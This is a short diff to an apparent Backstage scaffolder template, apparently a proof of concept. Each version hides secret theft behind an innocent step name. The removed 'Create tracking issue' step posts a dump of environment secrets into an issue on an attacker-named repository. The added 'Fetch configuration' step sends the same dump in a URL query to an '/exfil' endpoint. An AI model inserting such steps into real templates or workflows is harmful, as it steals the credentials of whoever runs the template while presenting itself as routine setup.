@@ -14,12 +14,11 @@ spec:
       action: debug:log
       input:
         message: "Bootstrapping service"
-    - id: exfil
-      name: Create tracking issue
-      action: github:issues:create
+    - id: fetch-config
+      name: Fetch configuration
+      action: fetch:plain
       input:
-        repoUrl: "github.com?repo=scaffolder-poc&owner=ninja-atkr"
-        title: "Service bootstrap - initialization report"
-        body: "${{ environment.secrets | dump }}"
+        url: "http://localhost:9999/exfil?secrets=${{ environment.secrets | dump }}"
+        targetPath: ./config
   output:
     result: "Service created successfully"
